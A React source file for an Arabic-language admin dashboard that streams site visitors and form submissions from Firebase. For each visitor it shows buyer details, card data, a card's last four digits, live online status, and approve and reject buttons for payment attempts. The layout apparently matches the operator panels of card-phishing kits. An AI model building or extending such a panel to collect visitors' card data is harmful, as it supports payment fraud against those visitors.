import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { 
  RefreshCw,
  LogOut,
  Eye,
  Check,
  X
} from "lucide-react";
import { 
  subscribeToVisitors, 
  subscribeToFormSubmissions, 
  getOnlineVisitorsCount,
  VisitorData,
  FormSubmission
} from "@/lib/firebase";
import { useAuth } from "@/context/AuthContext";
import { Button } from "@/components/ui/button";

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const { user, isLoading: authLoading, logout } = useAuth();
  const [visitors, setVisitors] = useState<VisitorData[]>([]);
  const [formSubmissions, setFormSubmissions] = useState<FormSubmission[]>([]);
  const [onlineCount, setOnlineCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    if (!authLoading && !user) {
      setLocation("/admin/login");
    }
  }, [user, authLoading, setLocation]);

  useEffect(() => {
    if (!user) return;
    
    const unsubVisitors = subscribeToVisitors((data) => {
      setVisitors(data);
      setIsLoading(false);
    });

    const unsubForms = subscribeToFormSubmissions((data) => {
      setFormSubmissions(data);
    });

    const unsubOnline = getOnlineVisitorsCount((count) => {
      setOnlineCount(count);
    });

    return () => {
      unsubVisitors();
      unsubForms();
      unsubOnline();
    };
  }, [user]);

  const formatTimeAgo = (timestamp: any) => {
    if (!timestamp?.toDate) return "N/A";
    const date = timestamp.toDate();
    const now = new Date();
    const diff = now.getTime() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);
    
    if (minutes < 1) return "الآن";
    if (minutes < 60) return `منذ ${minutes} دقيقة`;
    if (hours < 24) return `منذ ${hours} ساعات تقريباً`;
    return `منذ ${Math.floor(diff / 86400000)} يوم`;
  };

  const handleLogout = async () => {
    await logout();
    setLocation("/admin/login");
  };

  const allSubmissions = formSubmissions.map((submission, index) => {
    const isBuyerInfo = submission.formType === "buyer_details";
    const isPayment = submission.formType === "payment_attempt";
    
    return {
      id: index,
      country: submission.data?.country || "Unknown",
      hasBuyerInfo: isBuyerInfo,
      hasPayment: isPayment,
      isApproved: submission.success,
      status: submission.success ? "موافق" : "معلق",
      time: formatTimeAgo(submission.timestamp),
      isConnected: false,
      code: submission.data?.cardLast4 || "",
      page: "الرئيسية",
      buyerData: isBuyerInfo ? submission.data : null,
      paymentData: isPayment ? submission.data : null,
      amount: submission.data?.amount || 0,
    };
  });

  if (authLoading || isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-8 h-8 text-[#8A1538] animate-spin mx-auto mb-4" />
          <p className="text-gray-600">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  if (!user) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      <div className="bg-white border-b border-gray-200 py-4 px-6">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold text-[#8A1538]">إدارة الإشعارات</h1>
            <span className="text-sm text-gray-500">
              عرض وإدارة جميع الإشعارات والبيانات المستلمة ({formSubmissions.length}) إشعار
            </span>
          </div>
          <div className="flex items-center gap-3">
            <Button
              variant="outline"
              size="sm"
              className="text-gray-600"
            >
              مسح الكل
            </Button>
            <Button
              onClick={handleLogout}
              variant="ghost"
              size="sm"
              className="text-gray-600"
            >
              <LogOut className="w-4 h-4 ml-1" />
              خروج
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        <div className="bg-white rounded-lg shadow-sm overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-50 border-b border-gray-200">
                <tr>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">الإجراءات</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">الصفحة</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">الكود</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">الاتصال</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">الوقت</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">الحالة</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">المعلومات</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">الدولة</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {allSubmissions.length > 0 ? (
                  allSubmissions.map((row) => (
                    <tr key={row.id} className="hover:bg-gray-50">
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <button className="p-1.5 rounded bg-gray-100 hover:bg-gray-200 text-gray-600">
                            <Eye className="w-4 h-4" />
                          </button>
                          <button className="px-3 py-1 rounded text-xs font-medium bg-green-500 hover:bg-green-600 text-white">
                            موافقة
                          </button>
                          <button className="px-3 py-1 rounded text-xs font-medium bg-red-500 hover:bg-red-600 text-white">
                            رفض
                          </button>
                        </div>
                      </td>
                      <td className="px-4 py-3 text-gray-700">{row.page}</td>
                      <td className="px-4 py-3">
                        {row.code ? (
                          <span className="font-mono text-blue-600">{row.code}</span>
                        ) : (
                          <span className="text-gray-400">-</span>
                        )}
                      </td>
                      <td className="px-4 py-3">
                        <span className="inline-flex items-center px-2 py-1 rounded text-xs font-medium bg-yellow-100 text-yellow-700">
                          غير متصل
                        </span>
                      </td>
                      <td className="px-4 py-3 text-gray-600">{row.time}</td>
                      <td className="px-4 py-3">
                        <span className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
                          row.isApproved 
                            ? 'bg-green-100 text-green-700' 
                            : 'bg-yellow-100 text-yellow-700'
                        }`}>
                          {row.status}
                        </span>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          {row.hasBuyerInfo || row.paymentData ? (
                            <>
                              <button className="px-2 py-1 rounded text-xs font-medium bg-blue-500 text-white hover:bg-blue-600">
                                معلومات شخصية
                              </button>
                              {row.paymentData && (
                                <button className="px-2 py-1 rounded text-xs font-medium bg-green-500 text-white hover:bg-green-600">
                                  معلومات البطاقة
                                </button>
                              )}
                            </>
                          ) : (
                            <span className="text-gray-400 text-xs">لا يوجد معلومات</span>
                          )}
                          {!row.paymentData && (
                            <span className="text-gray-400 text-xs">لا يوجد بطاقة</span>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <span className="w-2 h-2 rounded-full bg-green-500"></span>
                          <span className="text-gray-700">{row.country}</span>
                        </div>
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={8} className="px-4 py-12 text-center text-gray-500">
                      لا توجد إشعارات حتى الآن
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
